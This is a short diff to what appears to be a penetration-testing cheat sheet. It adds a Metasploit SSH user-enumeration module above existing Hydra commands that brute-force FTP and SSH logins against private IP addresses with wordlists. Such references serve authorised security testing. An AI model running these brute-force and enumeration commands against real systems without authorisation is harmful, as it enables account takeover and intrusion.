@@ -14,6 +14,9 @@ hydra -L users.txt -e nsr 192.168.56.102 ftp
 ## Port 22 - SSH
 
 ```text
+# Test a users list to find a user
+msf > use auxiliary/scanner/ssh/ssh_enumusers
+
 # Hydra
 hydra -l root -P wordlist.txt 192.168.0.101 ssh
 hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
